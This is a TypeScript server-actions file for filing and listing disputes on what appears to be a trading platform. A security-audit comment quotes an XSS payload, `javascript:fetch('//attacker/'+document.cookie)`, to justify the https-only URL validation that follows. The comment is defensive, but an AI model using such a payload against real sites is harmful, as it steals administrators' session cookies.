"use server";

import { z } from "zod";
import { supabaseServer } from "@/lib/supabase/server";
import { requireUser } from "@/lib/auth/require-user";
import { createNotification } from "@/lib/actions/create-notification";
import { safeDbError } from "@/lib/db-error";
import type { Dispute, DisputeReason } from "@/lib/types";

// Audit N-H2: evidence_url is stored verbatim and rendered as
// <a href> in the admin disputes panel. Without scheme validation,
// a regular user can submit `javascript:fetch('//attacker/'+document.cookie)`
// or `data:text/html,...` — when an admin clicks "View evidence" the
// admin's session cookies are exfiltrated. That's privilege escalation
// from regular user → admin compromise.
//
// Same fix pattern as M-9 (broadcast action_url): require ^https://.
// Empty string is acceptable (no link → nothing renders).
//
// Audit N-H3: description was previously unbounded — capped here.
const raiseDisputeSchema = z.object({
  leaderId: z.string().uuid("Invalid leader id"),
  reason: z.enum(
    [
      "fake_trades",
      "performance_manipulation",
      "harassment",
      "spam",
      "other",
    ],
    { message: "Invalid dispute reason" },
  ),
  description: z.string().trim().min(1).max(2000),
  evidenceUrl: z
    .string()
    .trim()
    .max(500)
    .optional()
    .or(z.literal(""))
    .refine(
      (v) => !v || /^https:\/\//i.test(v),
      { message: "Evidence link must start with https://" },
    ),
});

export async function raiseDisputeAction(
  leaderId: string,
  reason: DisputeReason,
  description: string,
  evidenceUrl?: string,
) {
  const user = await requireUser();

  const parsed = raiseDisputeSchema.safeParse({
    leaderId,
    reason,
    description,
    evidenceUrl: evidenceUrl ?? "",
  });
  if (!parsed.success) {
    // Surface the first issue (e.g. the scheme refine) so users see the
    // actionable hint. None of these messages leak account-existence.
    return { error: parsed.error.issues[0]?.message ?? "Invalid dispute" };
  }

  if (parsed.data.leaderId === user.id) {
    return { error: "You cannot raise a dispute against yourself" };
  }

  const sb = await supabaseServer();

  const { data: existing, error: existingErr } = await sb
    .from("disputes")
    .select("id")
    .eq("raised_by", user.id)
    .eq("leader_id", parsed.data.leaderId)
    .in("status", ["open", "under_review"])
    .limit(1);

  if (existingErr) return { error: safeDbError(existingErr, "Couldn't check existing disputes.", "dispute_lookup") };
  if ((existing ?? []).length > 0) {
    return { error: "You already have an open dispute against this leader" };
  }

  const { error: insertErr } = await sb.from("disputes").insert({
    raised_by: user.id,
    leader_id: parsed.data.leaderId,
    reason: parsed.data.reason,
    description: parsed.data.description,
    evidence_url: parsed.data.evidenceUrl || null,
    status: "open",
  });

  if (insertErr) return { error: safeDbError(insertErr, "Couldn't file dispute.", "dispute_insert") };

  await createNotification(
    sb,
    parsed.data.leaderId,
    "dispute_opened",
    "Dispute filed against you",
    "A dispute has been raised against your account. Our team will review it.",
  );

  return { success: true as const };
}

export async function getMyDisputesAction(): Promise<Dispute[] | { error: string }> {
  const user = await requireUser();
  const sb = await supabaseServer();

  const { data, error } = await sb
    .from("disputes")
    .select("*")
    .eq("raised_by", user.id)
    .order("created_at", { ascending: false });

  if (error) return { error: safeDbError(error, "Couldn't load disputes.", "dispute_list") };
  return (data ?? []) as Dispute[];
}
